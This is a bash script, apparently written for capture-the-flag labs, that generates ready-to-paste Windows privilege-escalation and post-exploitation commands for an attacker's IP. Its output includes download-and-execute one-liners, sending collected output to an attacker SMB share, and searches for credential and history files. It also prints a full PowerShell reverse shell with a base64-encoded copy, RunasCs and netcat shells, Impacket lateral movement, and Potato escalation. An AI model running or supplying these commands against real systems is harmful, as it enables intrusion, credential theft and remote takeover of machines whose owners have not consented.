#!/bin/bash
#
# Windows PrivEsc Command Generator
# Generates ready-to-paste commands for bind shell enumeration
#

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Default values
DEFAULT_PORT=8000
DEFAULT_SMB_USER="kali"
DEFAULT_SMB_PASS="kali"
DEFAULT_SMB_SHARE="tmp"
DEFAULT_SMB_DIR="$HOME/htb"

echo -e "${CYAN}"
echo "=========================================="
echo " Windows PrivEsc Command Generator"
echo "=========================================="
echo -e "${NC}"

# Get IP
read -p "Enter your IP [auto-detect]: " IP
if [ -z "$IP" ]; then
    IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
    if [ -z "$IP" ]; then
        IP=$(ip -4 addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
    fi
    if [ -z "$IP" ]; then
        IP="10.10.14.1"
    fi
fi
printf "${GREEN}[+] Using IP: %s${NC}\n" "$IP"

# Get HTTP Port
read -p "Enter HTTP port [$DEFAULT_PORT]: " HTTP_PORT
HTTP_PORT=${HTTP_PORT:-$DEFAULT_PORT}

# Get SMB settings
read -p "Enter SMB share name [$DEFAULT_SMB_SHARE]: " SMB_SHARE
SMB_SHARE=${SMB_SHARE:-$DEFAULT_SMB_SHARE}

read -p "Enter SMB username [$DEFAULT_SMB_USER]: " SMB_USER
SMB_USER=${SMB_USER:-$DEFAULT_SMB_USER}

read -p "Enter SMB password [$DEFAULT_SMB_PASS]: " SMB_PASS
SMB_PASS=${SMB_PASS:-$DEFAULT_SMB_PASS}

read -p "Enter SMB local directory [$DEFAULT_SMB_DIR]: " SMB_DIR
SMB_DIR=${SMB_DIR:-$DEFAULT_SMB_DIR}

# Get reverse shell port
read -p "Enter reverse shell port [443]: " REV_PORT
REV_PORT=${REV_PORT:-443}

echo ""
echo -e "${CYAN}==========================================${NC}"
echo -e "${YELLOW}[1] START THESE ON KALI FIRST${NC}"
echo -e "${CYAN}==========================================${NC}"
echo ""

echo -e "${GREEN}# Terminal 1 - SMB Server:${NC}"
echo "impacket-smbserver $SMB_SHARE $SMB_DIR -username $SMB_USER -password $SMB_PASS -smb2support"
echo ""

echo -e "${GREEN}# Terminal 2 - HTTP Server:${NC}"
echo "cd $SMB_DIR && python3 -m http.server $HTTP_PORT"
echo ""

echo -e "${GREEN}# Terminal 3 - Reverse Shell Listener:${NC}"
echo "nc -nlvp $REV_PORT"
echo ""

echo -e "${CYAN}==========================================${NC}"
echo -e "${YELLOW}[2] FILE TRANSFER COMMANDS (Target)${NC}"
echo -e "${CYAN}==========================================${NC}"
echo ""

echo -e "${GREEN}# Download file (certutil):${NC}"
echo "certutil -urlcache -split -f http://$IP:$HTTP_PORT/FILE C:\\Windows\\Temp\\FILE"
echo ""

echo -e "${GREEN}# Download file (PowerShell):${NC}"
echo "iwr -uri http://$IP:$HTTP_PORT/FILE -OutFile C:\\Windows\\Temp\\FILE"
echo ""

echo -e "${GREEN}# Download and execute in memory:${NC}"
echo "iex(iwr -uri http://$IP:$HTTP_PORT/script.ps1 -UseBasicParsing)"
echo ""

echo -e "${GREEN}# Upload file via SMB:${NC}"
echo "net use \\\\$IP\\$SMB_SHARE /user:$SMB_USER $SMB_PASS"
echo "copy C:\\Windows\\Temp\\FILE \\\\$IP\\$SMB_SHARE\\"
echo "net use /d \\\\$IP\\$SMB_SHARE"
echo ""

echo -e "${CYAN}==========================================${NC}"
echo -e "${YELLOW}[3] PRIVESC SCRIPT - RUN + SAVE + TRANSFER${NC}"
echo -e "${CYAN}==========================================${NC}"
echo ""

echo -e "${GREEN}# ADGroupPrivEsc.ps1 - Full execution with output transfer:${NC}"
cat << EOF
powershell -ep bypass -c "iex(iwr http://$IP:$HTTP_PORT/ADGroupPrivEsc.ps1 -UseBasicParsing); \\\$Global:AttackerIP='$IP'; \\\$Global:AttackerPort=$HTTP_PORT; Initialize-Context; Test-BackupOperators; Show-Summary" 2>&1 > C:\\Windows\\Temp\\o.txt; cmd /c "net use \\\\$IP\\$SMB_SHARE /user:$SMB_USER $SMB_PASS && copy C:\\Windows\\Temp\\o.txt \\\\$IP\\$SMB_SHARE\\ && net use /d \\\\$IP\\$SMB_SHARE"
EOF
echo ""
echo ""

echo -e "${GREEN}# WinPrivEsc.ps1 - Full execution with output transfer:${NC}"
cat << EOF
powershell -ep bypass -c "iex(iwr http://$IP:$HTTP_PORT/WinPrivEsc.ps1 -UseBasicParsing); \\\$Global:AttackerIP='$IP'; \\\$Global:AttackerPort=$HTTP_PORT; Get-SystemContext; Get-CurrentUserInfo; Get-Services; Get-ScheduledTasks; Show-Summary" 2>&1 > C:\\Windows\\Temp\\o.txt; cmd /c "net use \\\\$IP\\$SMB_SHARE /user:$SMB_USER $SMB_PASS && copy C:\\Windows\\Temp\\o.txt \\\\$IP\\$SMB_SHARE\\ && net use /d \\\\$IP\\$SMB_SHARE"
EOF
echo ""
echo ""

echo -e "${CYAN}==========================================${NC}"
echo -e "${YELLOW}[4] QUICK ENUMERATION ONE-LINERS${NC}"
echo -e "${CYAN}==========================================${NC}"
echo ""

echo -e "${GREEN}# Find and read all sensitive files:${NC}"
cat << 'EOF'
powershell -ep bypass -c "Get-ChildItem -Path C:\Users,C:\xampp,C:\inetpub -Include *.txt,*.ini,*.config,*.xml,*.kdbx -File -Recurse -EA 0 | ForEach-Object { echo ('='*50); echo $_.FullName; echo ('='*50); gc $_ -EA 0 }"
EOF
echo ""

echo -e "${GREEN}# Whoami + Groups + Privileges:${NC}"
echo 'powershell -ep bypass -c "whoami /all"'
echo ""

echo -e "${GREEN}# Check all users:${NC}"
echo 'net user'
echo ""

echo -e "${GREEN}# PowerShell history:${NC}"
cat << 'EOF'
powershell -ep bypass -c "Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\*.txt -EA 0 | ForEach-Object { echo $_.FullName; gc $_ }"
EOF
echo ""

echo -e "${CYAN}==========================================${NC}"
echo -e "${YELLOW}[5] RUNASCS - RUN AS ANOTHER USER${NC}"
echo -e "${CYAN}==========================================${NC}"
echo ""

echo -e "${GREEN}# Download RunasCs:${NC}"
echo "certutil -urlcache -split -f http://$IP:$HTTP_PORT/RunasCs.exe C:\\Windows\\Temp\\r.exe"
echo ""

echo -e "${GREEN}# Run command as another user:${NC}"
echo 'C:\Windows\Temp\r.exe USERNAME "PASSWORD" "cmd /c whoami"'
echo 'C:\Windows\Temp\r.exe USERNAME "PASSWORD" "cmd /c type C:\Users\USERNAME\Desktop\flag.txt"'
echo ""

echo -e "${GREEN}# Get reverse shell as another user:${NC}"
echo "C:\\Windows\\Temp\\r.exe USERNAME \"PASSWORD\" cmd.exe -r $IP:$REV_PORT"
echo ""

echo -e "${CYAN}==========================================${NC}"
echo -e "${YELLOW}[6] REVERSE SHELLS${NC}"
echo -e "${CYAN}==========================================${NC}"
echo ""

echo -e "${GREEN}# PowerShell reverse shell (one-liner):${NC}"
cat << EOF
powershell -nop -c "\\\$c=New-Object Net.Sockets.TCPClient('$IP',$REV_PORT);\\\$s=\\\$c.GetStream();[byte[]]\\\$b=0..65535|%{0};while((\\\$i=\\\$s.Read(\\\$b,0,\\\$b.Length))-ne 0){\\\$d=(New-Object Text.ASCIIEncoding).GetString(\\\$b,0,\\\$i);\\\$r=(iex \\\$d 2>&1|Out-String);\\\$sb=([text.encoding]::ASCII).GetBytes(\\\$r+'PS '+(pwd).Path+'> ');\\\$s.Write(\\\$sb,0,\\\$sb.Length)};\\\$c.Close()"
EOF
echo ""
echo ""

echo -e "${GREEN}# Base64 encoded PowerShell reverse shell:${NC}"
PSCMD="\$c=New-Object Net.Sockets.TCPClient('$IP',$REV_PORT);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length))-ne 0){\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1|Out-String);\$sb=([text.encoding]::ASCII).GetBytes(\$r+'PS '+(pwd).Path+'> ');\$s.Write(\$sb,0,\$sb.Length)};\$c.Close()"
ENCODED=$(echo -n "$PSCMD" | iconv -t UTF-16LE | base64 -w 0)
echo "powershell -ep bypass -enc $ENCODED"
echo ""

echo -e "${CYAN}==========================================${NC}"
echo -e "${YELLOW}[7] IMPACKET COMMANDS (From Kali)${NC}"
echo -e "${CYAN}==========================================${NC}"
echo ""

echo -e "${GREEN}# Once you have credentials, connect from Kali:${NC}"
echo "impacket-psexec 'USERNAME:PASSWORD@TARGET_IP'"
echo "impacket-wmiexec 'USERNAME:PASSWORD@TARGET_IP'"
echo "impacket-smbexec 'USERNAME:PASSWORD@TARGET_IP'"
echo "evil-winrm -i TARGET_IP -u USERNAME -p 'PASSWORD'"
echo ""

echo -e "${CYAN}==========================================${NC}"
echo -e "${YELLOW}[8] POTATO ATTACKS (SeImpersonatePrivilege)${NC}"
echo -e "${CYAN}==========================================${NC}"
echo ""

echo -e "${GREEN}# Download tools:${NC}"
echo "certutil -urlcache -split -f http://$IP:$HTTP_PORT/PrintSpoofer64.exe C:\\Windows\\Temp\\ps.exe"
echo "certutil -urlcache -split -f http://$IP:$HTTP_PORT/GodPotato-NET4.exe C:\\Windows\\Temp\\gp.exe"
echo ""

echo -e "${GREEN}# PrintSpoofer:${NC}"
echo 'C:\Windows\Temp\ps.exe -i -c cmd'
echo 'C:\Windows\Temp\ps.exe -i -c powershell'
echo ""

echo -e "${GREEN}# GodPotato:${NC}"
echo 'C:\Windows\Temp\gp.exe -cmd "cmd /c whoami"'
echo "C:\\Windows\\Temp\\gp.exe -cmd \"nc.exe $IP $REV_PORT -e cmd.exe\""
echo ""

echo -e "${CYAN}==========================================${NC}"
echo -e "${GREEN}[+] Commands generated for IP: $IP${NC}"
echo -e "${GREEN}[+] HTTP Port: $HTTP_PORT${NC}"
echo -e "${GREEN}[+] SMB: \\\\$IP\\$SMB_SHARE (user:$SMB_USER)${NC}"
echo -e "${GREEN}[+] Reverse Shell Port: $REV_PORT${NC}"
echo -e "${CYAN}==========================================${NC}"
